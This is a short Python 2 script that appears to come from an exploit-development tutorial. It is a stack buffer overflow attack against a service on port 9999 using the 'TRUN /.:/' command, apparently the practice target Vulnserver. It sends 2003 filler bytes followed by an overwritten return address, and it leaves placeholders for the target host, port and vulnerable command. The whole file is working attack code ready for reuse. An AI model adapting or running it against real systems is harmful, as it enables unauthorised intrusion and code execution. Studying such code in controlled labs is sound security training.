#!/usr/bin/python
import sys, socket

returnaddress = "\xaf\x11\x50\x62" #This can be gathered from the result of our mona find command within Immunity, remember it will need to be written backwards and in 2 byte sections.

shellcode = "A" * 2003 + returnaddress
address = '127.0.0.1' #CHANGE THIS
port = 9999 #CHANGE THIS
vulncommand = 'TRUN /.:/' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((address,port))

	s.send((vulncommand + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
